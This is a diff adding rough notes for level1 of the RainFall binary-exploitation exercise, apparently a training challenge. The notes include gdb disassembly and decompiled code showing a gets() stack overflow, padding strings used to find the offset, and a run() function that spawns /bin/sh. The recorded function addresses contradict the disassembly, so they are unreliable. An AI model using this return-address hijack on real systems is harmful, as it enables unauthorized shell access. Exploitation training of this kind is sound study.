@@ -1,0 +1,78 @@
+level1@RainFall:~$ ls
+level1
+level1@RainFall:~$ ./level1 
+test
+level1@RainFall:~$ gdb ./level1 
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret    
+End of assembler dump.
+
+
+void main(void)
+
+{
+  char local_50 [76];
+  
+  gets(local_50);
+  return;
+}
+
+	
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+
+
+level1@RainFall:~$ ./level1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+level1@RainFall:~$ ./level1
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabc
+Illegal instruction (core dumped)
+
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbash ? -> overflow to function call
+
+
+
+void run(void)
+
+{
+  fwrite("Good... Wait what?\n",1,0x13,stdout);
+  system("/bin/sh");
+  return;
+}
+
+                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             undefined run()
+             undefined         <UNASSIGNED>   <RETURN>
+             undefined4        Stack[-0x10]:4 local_10                                XREF[1]:     08048456(W)  
+             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     0804845a(W)  
+             undefined4        Stack[-0x18]:4 local_18                                XREF[1]:     08048462(W)  
+             undefined4        Stack[-0x1c]:4 local_1c                                XREF[2]:     0804846a(*), 
+                                                                                                   08048472(*)  
+                             run                                             XREF[3]:     Entry Point(*), 080485a0, 
+                                                                                          0804860c(*)  
+
+Stack[-0x10] -> a 16 bits de return value
+
+main : 0x08048444
+run : 0x08048480
